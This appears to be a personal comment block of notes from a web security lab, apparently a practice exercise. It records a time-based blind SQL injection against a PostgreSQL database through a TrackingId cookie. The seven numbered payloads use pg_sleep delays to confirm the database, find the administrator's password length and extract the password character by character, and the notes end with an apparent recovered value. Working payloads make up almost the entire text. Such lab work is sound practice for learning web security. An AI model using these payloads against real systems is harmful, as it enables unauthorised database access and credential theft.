/*

1) Cookie: TrackingId=bwLk1z4IQ86ZRLBe'||pg_sleep(10)--
//delay
//postgresql db
//determination of db 

2) Cookie: TrackingId=e'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- 
//delay
//initial condition

3) Cookie: TrackingId=e'||(SELECT CASE WHEN (select length('aaa')=3) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
// delay
// if we replace 3 with 4 nodelay
//working towards length of password

4) Cookie: TrackingId=e'||(SELECT CASE WHEN (select length((select'aaa'))=3) THEN pg_sleep(3) ELSE pg_sleep(0) END)--;
//delay

5) Cookie: TrackingId=e'||(SELECT CASE WHEN (select length((select password from users where username = 'administrator'))=20) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
//delay
//password is 20 characters

6) Cookie: TrackingId=e'||(SELECT CASE WHEN ((select SUBSTRING((select 'aaa'),1,1))='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
//delay
//working towards enumerating password

7) Cookie: TrackingId=e'||(SELECT CASE WHEN ((select SUBSTRING((SELECT password FROM users WHERE username='administrator'),&&,1))='&&') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
//delay
//intruder
//ltbhcevdsm67jowwfi6z



*/